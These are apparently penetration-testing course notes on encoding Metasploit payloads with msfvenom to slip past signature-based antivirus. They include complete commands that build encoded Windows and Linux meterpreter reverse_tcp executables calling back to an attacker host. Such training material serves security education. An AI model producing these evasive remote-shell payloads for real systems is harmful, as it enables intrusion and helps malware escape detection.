# Encoding Payloads With Msfvenom

* Given that this attack vector involves the transfer and storage of a malicious payload on the client’s system (disk), attackers need to be cognisant of AV detection.
* Most end user AV solutions utilize signature based detection in order to identify malicious files or executables.
* We can evade older signature based AV solutions by encoding our payloads.
* Encoding is the process of modifying the payload shellcode with the objective of modifying the payload signature.

## Shellcode

* Shellcode is a piece of code typically used as a payload for exploitation
* It gets its name from the term command shell, whereby shellcode is a piece of code that provides an attacker with a remote command shell on the target system.

## Practice Demo

### List Encoders

* "<mark style="color:yellow;">msfvenom --list encoders</mark>"

### Generate an encoded Windows x86 payload

* "<mark style="color:yellow;">msfvenom -p windows/meterpreter/reverse\_tcp LHOST=ATTACKERIP LPORT=PORT -e x86/shikata\_ga\_nai -f exe > 'nameofpayload.extension'</mark>"

### Defining the number of iterations to encode

Add the "<mark style="color:red;">-i</mark>" flag and the number of iterations

Recommended is 10.

### Generate an encoded Linux x86 payload

* "<mark style="color:yellow;">msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=ATTACKERIP LPORT=PORT -i 10 -e x86/shikata\_ga\_nai -f elf > 'nameoffile.extension'</mark>"

Don't forget to setup the msf multi/Handler to receive the connection
